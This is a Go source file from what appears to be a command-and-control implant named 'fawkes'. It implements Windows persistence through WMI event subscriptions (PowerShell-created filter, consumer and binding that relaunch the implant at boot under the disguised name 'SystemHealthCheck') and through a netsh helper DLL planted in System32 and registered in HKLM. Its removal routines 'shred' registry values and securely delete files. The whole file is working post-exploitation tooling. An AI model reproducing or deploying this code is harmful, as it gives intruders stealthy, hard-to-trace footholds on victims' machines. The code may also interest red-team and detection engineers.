//go:build windows
// +build windows

package commands

import (
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows/registry"
)

// persistWMIEvent installs/removes WMI event subscription persistence (T1546.003).
// Creates __EventFilter + CommandLineEventConsumer + __FilterToConsumerBinding
// in root\subscription namespace. Triggers on system startup (within 300s of boot)
// or on a configurable timer interval.
func persistWMIEvent(args persistArgs) structs.CommandResult {
	if args.Name == "" {
		args.Name = "SystemHealthCheck"
	}

	switch strings.ToLower(args.Action) {
	case "install":
		return wmiEventInstall(args)
	case "remove":
		return wmiEventRemove(args)
	case "check", "list":
		return wmiEventCheck(args)
	default:
		return errorf("unknown action '%s'. Use: install, remove, or check", args.Action)
	}
}

func wmiEventInstall(args persistArgs) structs.CommandResult {
	if args.Path == "" {
		exe, err := os.Executable()
		if err != nil {
			return errorf("getting executable path: %v", err)
		}
		args.Path = exe
	}

	if _, err := os.Stat(args.Path); err != nil {
		return errorf("payload not found: %v", err)
	}

	filterName := args.Name + "_Filter"
	consumerName := args.Name + "_Consumer"

	interval := args.Timeout
	if interval == "" {
		interval = "300"
	}

	// WQL query: fires within <interval> seconds of system startup
	wqlQuery := fmt.Sprintf("SELECT * FROM __InstanceModificationEvent WITHIN %s WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120", interval)

	// Step 1: Create EventFilter
	filterPS := fmt.Sprintf(
		`$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{`+
			`Name='%s'; EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query='%s'`+
			`}; if ($filter) { 'FILTER_OK' } else { 'FILTER_FAIL' }`,
		filterName, wqlQuery)

	out, err := runPowerShell(filterPS)
	if err != nil || !strings.Contains(out, "FILTER_OK") {
		return errorf("creating WMI EventFilter: %v\nOutput: %s", err, out)
	}

	// Step 2: Create CommandLineEventConsumer
	escapedPath := strings.ReplaceAll(args.Path, `\`, `\\`)
	consumerPS := fmt.Sprintf(
		`$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{`+
			`Name='%s'; CommandLineTemplate='%s'`+
			`}; if ($consumer) { 'CONSUMER_OK' } else { 'CONSUMER_FAIL' }`,
		consumerName, escapedPath)

	out, err = runPowerShell(consumerPS)
	if err != nil || !strings.Contains(out, "CONSUMER_OK") {
		wmiEventRemoveByName(filterName, consumerName)
		return errorf("creating WMI EventConsumer: %v\nOutput: %s", err, out)
	}

	// Step 3: Create FilterToConsumerBinding
	bindingPS := fmt.Sprintf(
		`$filter = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='%s'"; `+
			`$consumer = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='%s'"; `+
			`$binding = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{`+
			`Filter=$filter; Consumer=$consumer`+
			`}; if ($binding) { 'BINDING_OK' } else { 'BINDING_FAIL' }`,
		filterName, consumerName)

	out, err = runPowerShell(bindingPS)
	if err != nil || !strings.Contains(out, "BINDING_OK") {
		wmiEventRemoveByName(filterName, consumerName)
		return errorf("creating WMI binding: %v\nOutput: %s", err, out)
	}

	return successf("WMI event subscription persistence installed (T1546.003):\n"+
		"  Filter:   %s\n"+
		"  Consumer: %s\n"+
		"  Payload:  %s\n"+
		"  Trigger:  SystemUpTime >= 120s (polled every %ss)\n"+
		"  Namespace: root\\subscription",
		filterName, consumerName, args.Path, interval)
}

func wmiEventRemove(args persistArgs) structs.CommandResult {
	filterName := args.Name + "_Filter"
	consumerName := args.Name + "_Consumer"

	var sb strings.Builder
	sb.WriteString("WMI event subscription removal:\n")

	errors := 0

	// Remove binding first
	bindPS := fmt.Sprintf(
		`Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | `+
			`Where-Object { $_.Filter -like '*%s*' } | Remove-WmiObject; 'BINDING_REMOVED'`,
		filterName)
	out, err := runPowerShell(bindPS)
	if err != nil {
		sb.WriteString(fmt.Sprintf("  Binding: removal failed (%v)\n", err))
		errors++
	} else if strings.Contains(out, "BINDING_REMOVED") {
		sb.WriteString("  Binding: removed\n")
	}

	// Remove consumer
	consumerPS := fmt.Sprintf(
		`Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='%s'" | `+
			`Remove-WmiObject; 'CONSUMER_REMOVED'`,
		consumerName)
	out, err = runPowerShell(consumerPS)
	if err != nil {
		sb.WriteString(fmt.Sprintf("  Consumer: removal failed (%v)\n", err))
		errors++
	} else if strings.Contains(out, "CONSUMER_REMOVED") {
		sb.WriteString(fmt.Sprintf("  Consumer: %s removed\n", consumerName))
	}

	// Remove filter
	filterPS := fmt.Sprintf(
		`Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='%s'" | `+
			`Remove-WmiObject; 'FILTER_REMOVED'`,
		filterName)
	out, err = runPowerShell(filterPS)
	if err != nil {
		sb.WriteString(fmt.Sprintf("  Filter: removal failed (%v)\n", err))
		errors++
	} else if strings.Contains(out, "FILTER_REMOVED") {
		sb.WriteString(fmt.Sprintf("  Filter: %s removed\n", filterName))
	}

	if errors > 0 {
		return errorf("Partial removal (%d errors):\n%s", errors, sb.String())
	}
	return successResult(sb.String())
}

func wmiEventCheck(args persistArgs) structs.CommandResult {
	checkPS := `$filters = Get-WmiObject -Namespace root\subscription -Class __EventFilter 2>$null; ` +
		`$consumers = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer 2>$null; ` +
		`$bindings = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding 2>$null; ` +
		`'FILTERS:'; if ($filters) { $filters | ForEach-Object { "  $($_.Name): $($_.Query)" } } else { '  (none)' }; ` +
		`'CONSUMERS:'; if ($consumers) { $consumers | ForEach-Object { "  $($_.Name): $($_.CommandLineTemplate)" } } else { '  (none)' }; ` +
		`'BINDINGS:'; if ($bindings) { $bindings | ForEach-Object { "  Filter=$($_.Filter) Consumer=$($_.Consumer)" } } else { '  (none)' }`

	out, err := runPowerShell(checkPS)
	if err != nil {
		return errorf("querying WMI subscriptions: %v", err)
	}

	return successf("=== WMI Event Subscriptions (root\\subscription) ===\n\n%s", out)
}

func wmiEventRemoveByName(filterName, consumerName string) {
	ps := fmt.Sprintf(
		`Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | `+
			`Where-Object { $_.Filter -like '*%s*' } | Remove-WmiObject 2>$null; `+
			`Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='%s'" | Remove-WmiObject 2>$null; `+
			`Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='%s'" | Remove-WmiObject 2>$null`,
		filterName, consumerName, filterName)
	runPowerShell(ps)
}

func runPowerShell(script string) (string, error) {
	cmd := safeCmd("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", script)
	out, err := cmd.CombinedOutput()
	return strings.TrimSpace(string(out)), err
}

// persistNetshHelper installs/removes Netsh Helper DLL persistence (T1546.007).
// Registers a DLL as a netsh helper that loads when any netsh command runs.
// Registry: HKLM\SOFTWARE\Microsoft\NetSh
func persistNetshHelper(args persistArgs) structs.CommandResult {
	if args.Name == "" {
		args.Name = "nshipsec"
	}

	const netshRegPath = `SOFTWARE\Microsoft\NetSh`

	switch strings.ToLower(args.Action) {
	case "install":
		if args.Path == "" {
			return errorResult("path is required (DLL to register as netsh helper)")
		}

		if _, err := os.Stat(args.Path); err != nil {
			return errorf("DLL not found: %v", err)
		}

		key, err := registry.OpenKey(registry.LOCAL_MACHINE, netshRegPath, registry.SET_VALUE|registry.QUERY_VALUE)
		if err != nil {
			return errorf("opening HKLM\\%s: %v (admin required)", netshRegPath, err)
		}
		defer key.Close()

		dllName := filepath.Base(args.Path)

		// Copy DLL to System32 for reliable loading
		destPath := filepath.Join(`C:\Windows\System32`, dllName)
		if args.Path != destPath {
			src, err := os.Open(args.Path)
			if err != nil {
				return errorf("opening source DLL: %v", err)
			}
			defer src.Close()

			dst, err := os.Create(destPath)
			if err != nil {
				return errorf("creating %s: %v (admin required)", destPath, err)
			}
			defer dst.Close()

			if _, err := io.Copy(dst, src); err != nil {
				return errorf("copying DLL to System32: %v", err)
			}
		}

		// Register: value name = helper name, value = DLL filename (no path — loaded from System32)
		if err := key.SetStringValue(args.Name, dllName); err != nil {
			return errorf("writing registry value: %v", err)
		}

		return successf("Netsh helper DLL persistence installed (T1546.007):\n"+
			"  Registry: HKLM\\%s\\%s = %s\n"+
			"  DLL:      %s\n"+
			"  Trigger:  DLL loads when any 'netsh' command runs\n"+
			"  Context:  Runs as the user invoking netsh",
			netshRegPath, args.Name, dllName, destPath)

	case "remove":
		key, err := registry.OpenKey(registry.LOCAL_MACHINE, netshRegPath, registry.SET_VALUE|registry.QUERY_VALUE)
		if err != nil {
			return errorf("opening HKLM\\%s: %v", netshRegPath, err)
		}
		defer key.Close()

		dllName, _, err := key.GetStringValue(args.Name)
		if err != nil {
			return errorf("netsh helper '%s' not found in registry: %v", args.Name, err)
		}

		// Shred registry value
		shredRegistryValue(key, args.Name)

		// Remove DLL from System32
		dllPath := filepath.Join(`C:\Windows\System32`, dllName)
		secureRemove(dllPath)
		if _, err := os.Stat(dllPath); err == nil {
			return successf("Netsh helper registry removed, but DLL still exists:\n"+
				"  Registry: %s removed\n"+
				"  DLL:      %s (removal failed — file still present)",
				args.Name, dllPath)
		}

		return successf("Netsh helper DLL persistence removed:\n"+
			"  Registry: HKLM\\%s\\%s removed (shredded)\n"+
			"  DLL:      %s removed",
			netshRegPath, args.Name, dllPath)

	case "check", "list":
		key, err := registry.OpenKey(registry.LOCAL_MACHINE, netshRegPath, registry.QUERY_VALUE)
		if err != nil {
			return errorf("opening HKLM\\%s: %v", netshRegPath, err)
		}
		defer key.Close()

		names, err := key.ReadValueNames(-1)
		if err != nil {
			return errorf("reading netsh helpers: %v", err)
		}

		var sb strings.Builder
		sb.WriteString("=== Netsh Helper DLLs ===\n\n")
		sb.WriteString(fmt.Sprintf("Registry: HKLM\\%s\n\n", netshRegPath))

		for _, name := range names {
			val, _, err := key.GetStringValue(name)
			if err != nil {
				continue
			}
			sb.WriteString(fmt.Sprintf("  %s = %s\n", name, val))
		}

		if len(names) == 0 {
			sb.WriteString("  (no helpers registered)\n")
		}

		return successResult(sb.String())

	default:
		return errorf("unknown action '%s'. Use: install, remove, or check", args.Action)
	}
}
